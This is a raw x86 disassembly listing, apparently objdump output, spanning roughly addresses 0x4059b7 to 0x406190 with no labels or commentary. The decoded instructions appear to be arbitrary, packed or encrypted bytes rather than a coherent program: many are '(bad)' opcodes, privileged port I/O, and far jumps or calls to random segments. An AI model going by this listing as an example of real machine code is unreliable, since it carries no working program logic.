  4059b7:	push   0xb66e0dae
  4059bc:	popf   
  4059bd:	in     al,dx
  4059be:	arpl   ax,cx
  4059c0:	xor    BYTE PTR [ecx+0x10],al
  4059c3:	wbinvd 
  4059c5:	loop   0x405954
  4059c7:	bound  ebp,QWORD PTR [ebx-0x20]
  4059ca:	jmp    0x23b099bd
  4059cf:	ds aam 0x8c
  4059d2:	jge    0x405956
  4059d4:	mov    WORD PTR [edi+ecx*2-0x72c6a24a],ds
  4059db:	cmp    al,0x50
  4059dd:	sar    ecx,cl
  4059df:	cld    
  4059e0:	mov    ah,0x9a
  4059e2:	fisubr WORD PTR [ebx]
  4059e4:	lods   eax,DWORD PTR ds:[esi]
  4059e5:	inc    ecx
  4059e6:	sub    BYTE PTR [esi+0x21],ah
  4059e9:	inc    esp
  4059ea:	cmp    BYTE PTR [ebp-0x18],0x31
  4059ee:	jecxz  0x4059c8
  4059f0:	gs stos DWORD PTR es:[edi],eax
  4059f2:	lea    edx,[ebx+0x3fbd6837]
  4059f8:	mov    ah,0x41
  4059fa:	mov    ds:0x6c8cc873,eax
  4059ff:	jl     0x4059f1
  405a01:	cmp    BYTE PTR [eax+edi*2-0x2f],al
  405a05:	arpl   WORD PTR [esi+0x776381a0],cx
  405a0b:	test   dh,dl
  405a0d:	aas    
  405a0e:	int3   
  405a0f:	in     eax,dx
  405a10:	or     BYTE PTR [ebx-0x38c32ced],0x6
  405a17:	int    0xe7
  405a19:	test   al,0xbf
  405a1b:	jne    0x4059bf
  405a1d:	pop    ss
  405a1e:	jno    0x4059e5
  405a20:	jle    0x405a10
  405a22:	mov    BYTE PTR [ebx-0x34],ah
  405a25:	jecxz  0x405a8e
  405a27:	jae    0x405aa7
  405a29:	lahf   
  405a2a:	dec    edx
  405a2b:	scas   al,BYTE PTR es:[edi]
  405a2c:	idiv   eax
  405a2e:	addr16 loop 0x4059bd
  405a31:	cmc    
  405a32:	mov    ch,0x56
  405a34:	mov    cl,0x13
  405a36:	outs   dx,BYTE PTR ds:[esi]
  405a37:	dec    ebx
  405a38:	cs pop eax
  405a3a:	shl    ch,cl
  405a3c:	jno    0x405a94
  405a3e:	sbb    DWORD PTR [eax],edx
  405a40:	loopne 0x405a23
  405a42:	ficomp DWORD PTR [ecx+ebp*4+0x18]
  405a46:	jl     0x405a8b
  405a48:	dec    edi
  405a49:	add    DWORD PTR [ebx+0x4e7a39ea],0xffffffde
  405a50:	into   
  405a51:	retf   
  405a52:	test   DWORD PTR [edx+eiz*1],0x95146492
  405a59:	push   0xffffffea
  405a5b:	rol    DWORD PTR [edx],cl
  405a5d:	push   ecx
  405a5e:	mov    bl,0x46
  405a60:	mov    ds:0xbeec5cb7,al
  405a65:	jae    0x405aca
  405a67:	mov    esi,0x4e8d7ff
  405a6c:	adc    eax,0x3a229938
  405a71:	adc    BYTE PTR [edx+ebp*8+0x4c],0xa9
  405a76:	xor    eax,DWORD PTR ds:0xec36dc1c
  405a7c:	inc    esi
  405a7d:	cli    
  405a7e:	dec    ebx
  405a7f:	mov    BYTE PTR [edi-0xfd6d9e6],dh
  405a85:	mov    BYTE PTR [edx-0x34],0xa0
  405a89:	stos   BYTE PTR es:[edi],al
  405a8a:	mov    ch,0x35
  405a8c:	mov    bh,0x2a
  405a8e:	sub    ebp,DWORD PTR [ebx+0x73]
  405a91:	and    eax,0x7a67d2ca
  405a96:	test   DWORD PTR [ebp+0xf06b2ec],esi
  405a9c:	dec    edx
  405a9d:	dec    ebx
  405a9e:	sub    bh,BYTE PTR [eax+ebp*8]
  405aa1:	cmp    al,0xf6
  405aa3:	mov    ecx,0x4e354c69
  405aa8:	mov    ebp,ebp
  405aaa:	and    al,BYTE PTR [esi]
  405aac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405aad:	fld    DWORD PTR [eax-0x4]
  405ab0:	call   0x6523375b
  405ab5:	pmaxub mm2,mm1
  405ab8:	pop    ds
  405ab9:	sti    
  405aba:	dec    eax
  405abb:	cs and dl,al
  405abe:	or     eax,0x6899acb6
  405ac3:	inc    esp
  405ac4:	popf   
  405ac5:	mov    ebp,0x67a0bb3d
  405aca:	dec    ebx
  405acb:	sbb    cl,dl
  405acd:	jbe    0x405a77
  405acf:	sub    DWORD PTR [ebp+edx*8-0x487f70bd],edi
  405ad6:	jp     0x405b03
  405ad8:	mov    esi,0xd0cd9913
  405add:	test   eax,0x3001df6
  405ae2:	cmovae ebx,esp
  405ae5:	ret    
  405ae6:	xor    esi,DWORD PTR [ebx*2+0xf7cf4d6]
  405aed:	js     0x405a70
  405aef:	xchg   ebp,eax
  405af0:	push   0xf2f954bf
  405af5:	sub    eax,0x125ba354
  405afa:	or     bh,BYTE PTR [eax+edx*2]
  405afd:	neg    DWORD PTR [ebx+0x41]
  405b00:	dec    eax
  405b01:	xlat   BYTE PTR ds:[ebx]
  405b02:	ja     0x405ae5
  405b04:	std    
  405b05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b06:	mov    bh,0x8a
  405b08:	add    al,0x9c
  405b0a:	push   eax
  405b0b:	or     dh,BYTE PTR [ebx]
  405b0d:	push   0x12
  405b0f:	xchg   edx,eax
  405b10:	jl     0x405aaa
  405b12:	mov    ecx,0x3032bf59
  405b17:	xchg   esp,eax
  405b18:	jge    0x405ae0
  405b1a:	pop    edx
  405b1b:	add    DWORD PTR ds:0x33d6a0b9,esp
  405b21:	jmp    0x69ae:0x5dd9be7a
  405b28:	das    
  405b29:	dec    edi
  405b2a:	add    DWORD PTR [eiz*4+0x5aba9bf2],esi
  405b31:	in     eax,dx
  405b32:	add    dl,BYTE PTR [eax+0x322496fb]
  405b38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b39:	in     al,dx
  405b3a:	(bad)  [edi]
  405b3c:	retf   0xb129
  405b3f:	daa    
  405b40:	mov    al,ds:0x38401dbc
  405b45:	(bad)  
  405b46:	test   eax,0x1d9fa1c8
  405b4b:	and    eax,DWORD PTR [eax+ebx*4-0x63]
  405b4f:	nop
  405b50:	imul   esi,eax,0x115de296
  405b56:	call   0x9e74:0x700dbb83
  405b5d:	je     0x405aed
  405b5f:	sti    
  405b60:	pop    edx
  405b61:	stc    
  405b62:	xor    edi,eax
  405b64:	inc    ebx
  405b65:	fbld   TBYTE PTR es:[ecx-0x17]
  405b69:	adc    ebx,DWORD PTR [edi-0x6a]
  405b6c:	loop   0x405b49
  405b6e:	xchg   BYTE PTR [edx+0x52],cl
  405b71:	enter  0x99db,0x55
  405b75:	repnz cdq 
  405b77:	xchg   esp,eax
  405b78:	out    0x25,eax
  405b7a:	(bad)  
  405b7b:	int3   
  405b7c:	into   
  405b7d:	mov    bh,al
  405b7f:	repnz mov dl,0x74
  405b82:	lods   al,BYTE PTR ds:[esi]
  405b83:	outs   dx,BYTE PTR ds:[esi]
  405b84:	xchg   ecx,eax
  405b85:	or     ebp,DWORD PTR [edx+0x4531e7ee]
  405b8b:	fwait
  405b8c:	dec    esi
  405b8d:	test   al,0x5d
  405b8f:	dec    esi
  405b90:	(bad)  
  405b93:	loop   0x405b88
  405b95:	sub    edx,esp
  405b97:	mov    al,0xf0
  405b99:	mov    edx,0xd54a3dec
  405b9e:	sub    eax,DWORD PTR [edi]
  405ba0:	hlt    
  405ba1:	jb     0x405b99
  405ba3:	cmp    edx,DWORD PTR [edi+0x656a5c49]
  405ba9:	jmp    0xcf9c:0xc877528a
  405bb0:	mov    ebp,0x31fa4d5f
  405bb5:	sub    dh,cl
  405bb7:	imul   ebx,eax,0xffffffa1
  405bba:	fidivr DWORD PTR [ebx-0x6f577194]
  405bc0:	sahf   
  405bc1:	push   ss
  405bc2:	jge    0x405bff
  405bc4:	clc    
  405bc5:	icebp  
  405bc6:	gs stos DWORD PTR es:[edi],eax
  405bc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405bc9:	stc    
  405bca:	loop   0x405ba7
  405bcc:	sbb    al,0x24
  405bce:	mov    ebx,ecx
  405bd0:	test   DWORD PTR ds:0x1912e825,eax
  405bd6:	std    
  405bd7:	pusha  
  405bd8:	xchg   ecx,eax
  405bd9:	call   0xeeaf4c5
  405bde:	push   ebx
  405bdf:	push   edi
  405be0:	sub    ecx,DWORD PTR [ecx-0x4b]
  405be3:	arpl   sp,ax
  405be5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405be6:	sub    esi,DWORD PTR [esi]
  405be8:	add    ah,ch
  405bea:	jno    0x405b86
  405bec:	inc    ebx
  405bed:	mov    dl,0x3e
  405bef:	(bad)  
  405bf0:	mov    ebx,0xe5550722
  405bf5:	fdiv   DWORD PTR [ebx-0x46]
  405bf8:	test   eax,0x795d1e0
  405bfd:	sub    esp,ebx
  405bff:	mov    eax,ds:0xfe175134
  405c04:	iret   
  405c05:	es xchg dh,dh
  405c08:	sti    
  405c09:	and    BYTE PTR ss:[eax+edx*4],ch
  405c0d:	js     0x405c29
  405c0f:	pop    edi
  405c10:	jle    0x405c00
  405c12:	xor    al,0xdd
  405c14:	inc    esi
  405c15:	int    0x75
  405c17:	xchg   ebx,eax
  405c18:	(bad)  [ebx+edx*8-0x57]
  405c1c:	nop
  405c1d:	cli    
  405c1e:	bound  esp,QWORD PTR [ebx-0x3e8b01f9]
  405c24:	mov    cl,bh
  405c26:	scas   al,BYTE PTR es:[edi]
  405c27:	shr    dh,1
  405c29:	xor    DWORD PTR [edi-0x6e454f58],ebp
  405c2f:	test   BYTE PTR [edi+eiz*4-0x733d8929],ah
  405c36:	rcr    DWORD PTR [ebx+0x6d004e8a],0x16
  405c3d:	test   BYTE PTR [ecx-0x74],al
  405c40:	fwait
  405c41:	cs jle 0x405c57
  405c44:	in     eax,dx
  405c45:	mov    al,BYTE PTR [edi+0x71831135]
  405c4b:	iret   
  405c4c:	in     eax,0x7e
  405c4e:	push   ebx
  405c4f:	sub    eax,0x5fe163c7
  405c54:	mov    esi,0x161038f9
  405c59:	sub    BYTE PTR [esi-0x2661636f],cl
  405c5f:	push   esp
  405c60:	jnp    0x405c7f
  405c62:	sub    ch,ch
  405c64:	(bad)  [edx+eiz*1-0x5c5dc0cf]
  405c6b:	and    al,0x97
  405c6d:	xlat   BYTE PTR ds:[ebx]
  405c6e:	pop    es
  405c6f:	jg     0x405cb1
  405c71:	jb     0xb18a3744
  405c77:	sbb    al,0x27
  405c79:	push   edi
  405c7a:	mov    ecx,0x5f14981d
  405c7f:	add    dl,BYTE PTR [eax-0x52]
  405c82:	add    eax,0xb73ad243
  405c87:	fs and eax,0x3d8c6bea
  405c8d:	gs inc edx
  405c8f:	push   0x44
  405c91:	inc    ebx
  405c92:	icebp  
  405c93:	cmp    BYTE PTR [edi],dl
  405c95:	ja     0x405cff
  405c97:	loopne 0x405c72
  405c99:	seto   BYTE PTR [ebx-0x608056d6]
  405ca0:	cwde   
  405ca1:	sbb    ebx,DWORD PTR [ecx+0x4fb7a0f4]
  405ca7:	and    al,0x50
  405ca9:	or     eax,0xc09d850
  405cae:	xchg   ecx,eax
  405caf:	cmp    bh,bh
  405cb1:	adc    BYTE PTR [ebx+edi*8-0x3f],cl
  405cb5:	(bad)  [esi-0x30198c88]
  405cbb:	mov    ah,0xc7
  405cbd:	xlat   BYTE PTR ds:[ebx]
  405cbe:	popf   
  405cbf:	inc    ebp
  405cc0:	pushf  
  405cc1:	repnz sti 
  405cc3:	inc    ebx
  405cc4:	xor    al,0xe5
  405cc7:	stos   BYTE PTR es:[edi],al
  405cc8:	je     0x405c9e
  405cca:	fdiv   DWORD PTR [edi-0x391f1d12]
  405cd0:	test   dl,0xff
  405cd3:	ror    DWORD PTR [ebp+0x24],1
  405cd6:	cmp    esi,DWORD PTR [ecx-0x4b10c191]
  405cdc:	leave  
  405cdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405cde:	fdivp  st(1),st
  405ce0:	nop
  405ce1:	retf   
  405ce2:	shl    DWORD PTR ds:0x1d8d,0x71
  405ce8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ce9:	cmp    ecx,DWORD PTR [esi+0x45]
  405cec:	sahf   
  405ced:	sub    DWORD PTR [edx],esi
  405cef:	mov    al,ds:0xe9b77d5f
  405cf4:	xchg   esi,eax
  405cf5:	or     BYTE PTR [esi-0x1c],bl
  405cf8:	out    0x95,al
  405cfa:	pop    esp
  405cfb:	aaa    
  405cfc:	loop   0x405d47
  405cfe:	mov    bh,0x4c
  405d00:	or     eax,0x25648356
  405d05:	repz daa 
  405d07:	es lahf 
  405d09:	mov    ah,0xd7
  405d0b:	sbb    ebx,DWORD PTR [eax-0x5a]
  405d0e:	ret    
  405d0f:	mov    dh,0x99
  405d11:	into   
  405d12:	mov    cl,0x87
  405d14:	stos   BYTE PTR es:[edi],al
  405d15:	iret   
  405d16:	push   0x7b2d21ac
  405d1b:	inc    edx
  405d1c:	and    eax,0xf6ac8bb0
  405d21:	in     eax,0x8c
  405d23:	cmp    BYTE PTR [eax+ebp*8+0x2fe412f],dh
  405d2a:	lods   eax,DWORD PTR ds:[esi]
  405d2b:	xor    esi,0x6
  405d2e:	mov    ah,0x21
  405d30:	fld    QWORD PTR [esi-0x4b]
  405d33:	repz loop 0x405d8b
  405d36:	test   al,0xd5
  405d38:	push   esp
  405d39:	jb     0x405cbd
  405d3b:	jmp    0x405d51
  405d3d:	dec    eax
  405d3e:	inc    ebp
  405d3f:	and    eax,0xeaf5ac3d
  405d44:	add    al,0xa2
  405d46:	ins    DWORD PTR es:[edi],dx
  405d47:	sub    eax,0x86b43f43
  405d4c:	and    DWORD PTR [eax+0x49579336],eax
  405d52:	fsub   st(1),st
  405d54:	add    al,0xce
  405d56:	pop    ebp
  405d57:	cs sbb eax,0x38a2831c
  405d5d:	xor    DWORD PTR [edi],0xffffff9e
  405d60:	fsub   st(3),st
  405d62:	push   0xffffffc2
  405d64:	or     DWORD PTR [ecx],0x71
  405d67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d68:	xchg   BYTE PTR [edx],bl
  405d6a:	inc    esi
  405d6b:	mov    ch,0x91
  405d6d:	dec    edx
  405d6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d6f:	lds    ebx,FWORD PTR [edx+0x733192a9]
  405d75:	sbb    DWORD PTR [ebx],edx
  405d77:	xchg   edx,eax
  405d78:	mov    ch,0xe2
  405d7a:	lock and al,0x2f
  405d7d:	mov    ds:0x514ee4d1,al
  405d82:	fnstenv [edx]
  405d84:	shr    BYTE PTR es:[ebp+0x63c7d909],0x71
  405d8c:	push   esp
  405d8d:	jb     0x405dbd
  405d8f:	pusha  
  405d90:	jno    0x405d8d
  405d92:	lods   eax,DWORD PTR ds:[esi]
  405d93:	mov    dh,0xf6
  405d96:	ret    
  405d97:	mov    ds:0xec55df6b,eax
  405d9c:	loopne 0x405e0a
  405d9e:	dec    ecx
  405d9f:	xchg   ebp,eax
  405da0:	(bad)  
  405da1:	stos   DWORD PTR es:[edi],eax
  405da2:	xchg   BYTE PTR [ebp+edi*1+0x17],ch
  405da6:	dec    ebx
  405da7:	add    DWORD PTR [edx-0x6],ebp
  405daa:	adc    DWORD PTR [ebx-0x527875cf],ebp
  405db0:	dec    BYTE PTR [esi]
  405db2:	les    edi,FWORD PTR [ebp+0x18]
  405db5:	loopne 0x405db4
  405db7:	sbb    ch,BYTE PTR [ecx-0x270db597]
  405dbd:	scas   eax,DWORD PTR es:[edi]
  405dbe:	xchg   edx,eax
  405dbf:	mov    DWORD PTR [eax-0x33],edx
  405dc2:	cmc    
  405dc3:	adc    ch,bh
  405dc5:	outs   dx,BYTE PTR ds:[esi]
  405dc6:	adc    al,0x41
  405dc8:	call   0x8dcb2db
  405dcd:	mov    ds:0xd97030ba,al
  405dd2:	fsubr  DWORD PTR [ebx+0x3b]
  405dd5:	sub    eax,DWORD PTR [ebx]
  405dd7:	xchg   esi,eax
  405dd8:	leave  
  405dd9:	mov    al,ds:0x1d7ebd9f
  405dde:	out    0xa0,eax
  405de0:	iret   
  405de1:	retf   
  405de2:	dec    esp
  405de3:	inc    eax
  405de4:	fisttp QWORD PTR [edx]
  405de6:	mov    al,0x21
  405de8:	mov    eax,ds:0xe63e257a
  405ded:	pop    eax
  405dee:	jmp    0x3fe2:0x709da2d1
  405df5:	arpl   WORD PTR [eax-0x68d32051],si
  405dfb:	call   DWORD PTR [eax-0x6d974f40]
  405e01:	nop
  405e02:	adc    DWORD PTR [ebx-0x68],0x18476621
  405e09:	adc    al,0x65
  405e0b:	mov    al,BYTE PTR [esp+edx*4+0xd0185ea]
  405e12:	dec    ecx
  405e13:	and    al,0x36
  405e15:	jne    0x405de1
  405e17:	xchg   ebp,eax
  405e18:	out    0x40,eax
  405e1a:	jmp    0xe3cf:0xef5e0e0c
  405e21:	mov    ebx,0x5ea8bc65
  405e26:	rol    dl,cl
  405e28:	xor    eax,DWORD PTR [ebp-0x3035f2ae]
  405e2e:	push   cs
  405e2f:	push   esp
  405e30:	stos   DWORD PTR es:[edi],eax
  405e31:	pop    ecx
  405e32:	test   al,0x80
  405e34:	adc    al,0xe8
  405e36:	mov    ecx,fs
  405e38:	sbb    eax,0x36ba6144
  405e3d:	pop    edx
  405e3e:	scas   al,BYTE PTR es:[edi]
  405e3f:	fldenv [edx]
  405e41:	mov    fs,WORD PTR [edx]
  405e43:	xchg   ebx,eax
  405e44:	(bad)  
  405e45:	jnp    0x405e70
  405e47:	inc    eax
  405e48:	mov    esp,0x92e49bc9
  405e4d:	loop   0x405df4
  405e4f:	push   0x71
  405e51:	pop    ss
  405e52:	test   eax,0xb25607c6
  405e57:	and    eax,0xae28fdad
  405e5c:	xor    eax,0x44c7cea0
  405e61:	mov    cl,0x50
  405e63:	popf   
  405e64:	jl     0x405e31
  405e66:	fld    QWORD PTR [ecx-0x28]
  405e69:	xchg   esi,eax
  405e6a:	add    DWORD PTR [esi+0x78],esp
  405e6d:	jno    0x405e40
  405e6f:	lds    esi,FWORD PTR [esi-0x75]
  405e72:	mov    esi,0xb6de70c2
  405e77:	test   DWORD PTR [esi+0x14],0x925e4a75
  405e7e:	inc    esi
  405e7f:	das    
  405e80:	xchg   esp,eax
  405e81:	add    BYTE PTR [ebx+0x64e98f34],ah
  405e87:	cld    
  405e88:	test   BYTE PTR [ebx],ch
  405e8a:	mov    ds:0x567707f3,eax
  405e8f:	loop   0x405e65
  405e91:	popf   
  405e92:	add    BYTE PTR [edx],ah
  405e94:	aaa    
  405e95:	cs xor eax,0x99ae8c74
  405e9b:	sub    BYTE PTR [edx-0x20a07e73],cl
  405ea1:	(bad)  
  405ea2:	mov    ds:0x98b7b5b2,eax
  405ea7:	mov    ecx,edi
  405ea9:	cmp    BYTE PTR [eax+0x31e4c781],dh
  405eaf:	adc    DWORD PTR [ecx+esi*4],ebx
  405eb2:	mov    eax,ds:0xdcdafb61
  405eb7:	sbb    al,cl
  405eb9:	aad    0x67
  405ebb:	add    edx,ebp
  405ebd:	adc    dl,BYTE PTR [ebx-0x4e3698b6]
  405ec3:	jmp    0x405ecf
  405ec5:	popa   
  405ec6:	sub    ax,0x7f31
  405eca:	xchg   ebp,eax
  405ecb:	cdq    
  405ecc:	pop    es
  405ecd:	push   edx
  405ece:	inc    ebx
  405ecf:	cwde   
  405ed0:	repnz clc 
  405ed2:	mov    DWORD PTR [edx-0x7a18736b],0x299e9797
  405edc:	adc    bl,BYTE PTR [edi+0x3c507212]
  405ee2:	adc    dl,bl
  405ee4:	loope  0x405e87
  405ee6:	adc    BYTE PTR [eax-0x79],dh
  405ee9:	mov    esp,0x8ad61a90
  405eee:	mov    dl,0x9c
  405ef0:	enter  0x9c2e,0x24
  405ef4:	push   edi
  405ef5:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  405ef7:	scas   eax,DWORD PTR es:[edi]
  405ef8:	push   ebx
  405ef9:	test   BYTE PTR [esi-0x3e4f0278],ah
  405eff:	ror    BYTE PTR [ecx],cl
  405f01:	lea    edx,[eax]
  405f03:	loope  0x405e93
  405f05:	sar    DWORD PTR [ecx+0x2a],cl
  405f08:	jg     0x405f58
  405f0a:	mov    edx,0xf2f5a6f9
  405f0f:	push   esi
  405f10:	stos   BYTE PTR es:[edi],al
  405f11:	iret   
  405f12:	pusha  
  405f13:	ret    0x84ec
  405f16:	hlt    
  405f17:	mov    al,0xf4
  405f19:	aam    0xee
  405f1b:	jnp    0x405f6a
  405f1d:	mov    eax,0x87680acd
  405f22:	push   ecx
  405f23:	jmp    0x405f1a
  405f25:	popa   
  405f26:	jnp    0x405f27
  405f28:	cmp    edi,esp
  405f2a:	mov    DWORD PTR [edi-0x405802af],ebp
  405f30:	mov    BYTE PTR [edi+0x77a058f7],ah
  405f36:	icebp  
  405f37:	cmp    eax,0x72235326
  405f3c:	and    al,0x5a
  405f3e:	pop    ebp
  405f3f:	mov    edi,0xce6e66f5
  405f44:	pop    ss
  405f45:	ja     0x405f9b
  405f47:	mov    eax,ds:0x7fa1977f
  405f4c:	fdiv   st(0),st
  405f4e:	or     eax,DWORD PTR [ebx+0x22]
  405f51:	in     eax,0x3d
  405f53:	sar    BYTE PTR [edi],cl
  405f55:	sub    BYTE PTR [edx+0x6],0x69
  405f59:	repnz pop eax
  405f5b:	or     BYTE PTR [eax],0x6b
  405f5e:	push   ds
  405f5f:	or     BYTE PTR [esi+edi*8-0x79e47ea2],cl
  405f66:	sub    DWORD PTR [esi+0xb],esp
  405f69:	les    edi,FWORD PTR [edi+ebp*2]
  405f6c:	mov    ?,WORD PTR [ecx+esi*8+0x2b]
  405f70:	call   0x78edd1ec
  405f75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f76:	mov    eax,ds:0xbd580e7
  405f7b:	ja     0x405ff5
  405f7d:	icebp  
  405f7e:	sbb    esi,0x57
  405f81:	pop    ebp
  405f82:	or     edi,DWORD PTR [eax+0x7721541c]
  405f88:	add    dh,ch
  405f8a:	fwait
  405f8b:	dec    ecx
  405f8c:	jecxz  0x405f24
  405f8e:	stos   DWORD PTR es:[edi],eax
  405f8f:	inc    ebp
  405f90:	pop    ds
  405f91:	or     ecx,DWORD PTR [edx-0x440ef77]
  405f97:	sbb    esi,DWORD PTR [edi+0x5fc262ae]
  405f9d:	push   es
  405f9e:	scas   al,BYTE PTR es:[edi]
  405f9f:	inc    ebp
  405fa0:	xor    eax,0x4b48f843
  405fa5:	(bad)  
  405fa6:	push   ss
  405fa7:	divps  xmm5,xmm4
  405faa:	mov    ds:0xc6781927,eax
  405faf:	add    cl,0xf5
  405fb2:	jmp    0x405fcd
  405fb4:	xchg   ecx,eax
  405fb5:	(bad)  
  405fb6:	call   0xc03:0x1b7a485c
  405fbd:	add    DWORD PTR [ebp-0x68],esp
  405fc0:	inc    edx
  405fc1:	push   cs
  405fc2:	fadd   QWORD PTR [edi-0x35]
  405fc5:	mov    al,ds:0x5dcdd1b2
  405fca:	iret   
  405fcb:	cmp    DWORD PTR [ebx-0x1f],ebp
  405fce:	retf   0xbf11
  405fd1:	mov    cs,WORD PTR [eax]
  405fd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405fd4:	push   edi
  405fd5:	pop    ds
  405fd6:	lds    ebx,FWORD PTR [ebp+0x18652a8c]
  405fdc:	xor    eax,0x30f8d793
  405fe1:	(bad)  
  405fe3:	mov    ch,BYTE PTR [ecx-0x7c06883]
  405fe9:	mov    esi,DWORD PTR [esi+0x61]
  405fec:	jecxz  0x406029
  405fee:	pop    es
  405fef:	push   esp
  405ff0:	xor    dh,BYTE PTR [eax]
  405ff2:	aad    0xe2
  405ff4:	cmp    edx,DWORD PTR [edx]
  405ff6:	inc    edx
  405ff7:	outs   dx,DWORD PTR ds:[esi]
  405ff8:	or     eax,0x14a8519a
  405ffd:	mov    dh,0xd3
  405fff:	xchg   esp,ebx
  406001:	or     edx,esp
  406003:	das    
  406004:	in     eax,dx
  406005:	mov    ds:0x81fcf380,al
  40600a:	adc    DWORD PTR ds:0x60980e7d,ebp
  406010:	xor    al,0x92
  406012:	pusha  
  406013:	cmc    
  406014:	cmp    BYTE PTR [eax+0x12b4dcb6],ch
  40601a:	inc    edi
  40601b:	shl    ch,0x6e
  40601e:	cmp    DWORD PTR [esi-0x655a4be8],0xffffffc8
  406025:	xor    bl,bh
  406027:	clc    
  406028:	inc    esp
  406029:	pop    ebp
  40602a:	pop    ss
  40602b:	outs   dx,BYTE PTR ds:[esi]
  40602c:	ds cmp ebp,edi
  40602f:	fcomp  DWORD PTR [edi]
  406031:	mov    WORD PTR [edi+0x23],cs
  406034:	mov    edx,0x3a3a0057
  406039:	and    al,0x34
  40603b:	pop    esi
  40603c:	pop    DWORD PTR [edx-0x49]
  40603f:	cld    
  406040:	jmp    0x406081
  406042:	push   ebp
  406043:	pop    gs
  406045:	add    bh,BYTE PTR [edi]
  406047:	hlt    
  406048:	je     0x40600d
  40604a:	xor    bl,BYTE PTR [edi-0x36]
  40604d:	or     esi,DWORD PTR [edx+0x1ec133a9]
  406053:	dec    eax
  406054:	adc    edi,eax
  406056:	or     eax,0xccacb4c0
  40605b:	add    BYTE PTR [edx-0x55],bh
  40605e:	mov    ebp,0x8bcc87fa
  406063:	mov    es,WORD PTR ds:0xc74a5385
  406069:	stc    
  40606a:	mov    esi,DWORD PTR [esi+0x616dfccf]
  406070:	or     eax,0x3f8097b2
  406075:	jnp    0x4060a6
  406077:	adc    DWORD PTR [ecx+0x30],ebx
  40607a:	push   es
  40607b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40607c:	in     eax,dx
  40607d:	pop    esi
  40607e:	pop    esp
  40607f:	sub    dh,BYTE PTR [eax+0x6567c8f0]
  406085:	int    0x52
  406087:	xchg   ebp,eax
  406088:	inc    ebx
  406089:	arpl   WORD PTR [edi+0x71],dx
  40608c:	shr    DWORD PTR [ecx+0x421e68a6],0x4c
  406093:	and    ch,0xbb
  406096:	xor    al,0x72
  406098:	test   BYTE PTR [edx],dh
  40609a:	xlat   BYTE PTR ds:[ebx]
  40609b:	add    BYTE PTR [ebx],al
  40609d:	(bad)  
  40609f:	mov    ecx,0x91624ff0
  4060a4:	lods   al,BYTE PTR ds:[esi]
  4060a5:	pushf  
  4060a6:	aaa    
  4060a7:	lahf   
  4060a8:	out    dx,eax
  4060a9:	dec    edi
  4060aa:	jg     0x406094
  4060ac:	xchg   edx,eax
  4060ad:	jae    0x406124
  4060af:	mov    eax,0x9428b24e
  4060b4:	dec    esi
  4060b5:	fiadd  DWORD PTR ds:0x16b7ca36
  4060bb:	inc    edi
  4060bc:	das    
  4060bd:	nop
  4060be:	hlt    
  4060bf:	int3   
  4060c0:	leave  
  4060c1:	test   DWORD PTR [esi],ebp
  4060c3:	xchg   ecx,eax
  4060c4:	ja     0x40613b
  4060c6:	jbe    0x406132
  4060c8:	cs inc esi
  4060ca:	stc    
  4060cb:	call   0xf528:0x513d39ff
  4060d2:	shl    BYTE PTR [esi-0xc4e20ad],1
  4060d8:	sbb    BYTE PTR [eax],0x91
  4060db:	shr    BYTE PTR [edi+ebx*2+0x4e],cl
  4060df:	clc    
  4060e0:	adc    bl,cl
  4060e2:	(bad)  
  4060e3:	or     al,0x12
  4060e5:	outs   dx,BYTE PTR ds:[esi]
  4060e6:	loopne 0x406098
  4060e8:	sub    eax,0x631547ff
  4060ed:	push   esp
  4060ee:	lea    ebp,[edi]
  4060f0:	xlat   BYTE PTR cs:[ebx]
  4060f2:	lds    edi,FWORD PTR ds:0x440a84b5
  4060f8:	mov    dh,0x32
  4060fa:	shr    DWORD PTR [edx],0x28
  4060fd:	fdiv   DWORD PTR [ebx+0x716d4f29]
  406103:	pop    ss
  406104:	lock push es
  406106:	iret   
  406107:	out    0x9d,al
  406109:	js     0x4060d3
  40610b:	cmp    ebx,ebx
  40610d:	push   edi
  40610e:	mov    WORD PTR [ebp-0x1b],fs
  406111:	push   esp
  406112:	and    al,0x4b
  406114:	scas   al,BYTE PTR es:[edi]
  406115:	fbstp  TBYTE PTR [esi]
  406117:	mov    esi,0x707a4dda
  40611c:	mov    dh,0x22
  40611e:	pop    eax
  40611f:	and    al,BYTE PTR [edi+ebp*8+0x2513ccbf]
  406126:	sbb    eax,0x681ec933
  40612b:	and    BYTE PTR [edi+0x157be12c],0xdc
  406132:	shr    DWORD PTR [eax-0x63],cl
  406135:	adc    BYTE PTR [edx],dh
  406137:	sub    eax,0xd9e02f6e
  40613c:	xlat   BYTE PTR ds:[ebx]
  40613d:	pop    ebp
  40613e:	xor    bl,BYTE PTR [edx]
  406140:	pop    es
  406141:	(bad)  [esi]
  406143:	xchg   DWORD PTR [ebp-0x4aebc504],esp
  406149:	xor    edi,eax
  40614b:	xor    BYTE PTR [edx+esi*2-0x2fcf4edd],ah
  406152:	mov    eax,ds:0xad8d3ae8
  406157:	xor    al,0x81
  406159:	hlt    
  40615a:	xchg   ecx,eax
  40615b:	adc    al,0x56
  40615d:	or     eax,0xb5f944ab
  406162:	fstp   TBYTE PTR [edx]
  406164:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406165:	aam    0xea
  406167:	idiv   DWORD PTR [ecx+0x521581e0]
  40616d:	mov    dh,0x25
  40616f:	cmp    eax,0xd6b5ef7
  406174:	rol    DWORD PTR [ebx+0x73],1
  406177:	scas   eax,DWORD PTR es:[edi]
  406178:	mov    eax,ds:0xdd3dee52
  40617d:	bound  ebx,QWORD PTR [ebx]
  40617f:	push   ss
  406180:	or     DWORD PTR [ecx],0xbbed3e1
  406186:	adc    BYTE PTR [esi],dh
  406188:	jecxz  0x406176
  40618a:	ficomp DWORD PTR [edx]
  40618c:	gs fs xchg edx,eax
  40618f:	aas    
  406190:	daa    
